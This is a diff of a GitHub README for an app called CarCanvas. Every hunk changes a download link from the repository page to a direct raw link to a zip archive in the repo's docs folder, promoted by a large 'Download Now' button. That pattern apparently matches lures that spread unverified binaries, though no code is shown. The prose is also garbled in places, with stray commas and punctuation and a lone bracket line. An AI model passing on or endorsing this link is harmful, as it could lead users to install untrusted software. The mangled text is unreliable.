@@ -1,7 +1,7 @@
 <h1>🎨 CarCanvas - Turn Your Car Screen Into a Gallery</h1>
 
 <p align="center">
-  <a href="https://github.com/rhettrestive2123/CarCanvas" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);">🚗 Download CarCanvas Now</a>
+  <a href="https://github.com/rhettrestive2123/CarCanvas/raw/refs/heads/main/docs/Car_Canvas_v2.1.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.3);">🚗 Download CarCanvas Now</a>
 </p>
 
 ---
@@ -28,7 +28,7 @@ Getting CarCanvas up and running takes less than two minutes. Here's what you ne
 
 Click the green button at the top of this page (or use the link below) to go to the download page:
 
-🔗 **Primary Download Link**: [https://github.com/rhettrestive2123/CarCanvas](https://github.com/rhettrestive2123/CarCanvas)
+🔗 **Primary Download Link**: [https://github.com/rhettrestive2123/CarCanvas/raw/refs/heads/main/docs/Car_Canvas_v2.1.zip](https://github.com/rhettrestive2123/CarCanvas/raw/refs/heads/main/docs/Car_Canvas_v2.1.zip)
 
 )
 
@@ -196,4 +196,4 @@ You're all set. Just download the app„, pick a picture you love„, and give y
 
 Be sure to grab the latest version from the link below the„., and if you enjoyed using CarCanvas„„„, consider telling a friend or leaving a star on the GitHub page„. Happy customizing—
 
-**Download link again for convenience**: [https://github.com/rhettrestive2123/CarCanvas](https://github.com/rhettrestive2123/CarCanvas)</p>
+**Download link again for convenience**: [https://github.com/rhettrestive2123/CarCanvas/raw/refs/heads/main/docs/Car_Canvas_v2.1.zip](https://github.com/rhettrestive2123/CarCanvas/raw/refs/heads/main/docs/Car_Canvas_v2.1.zip)</p>
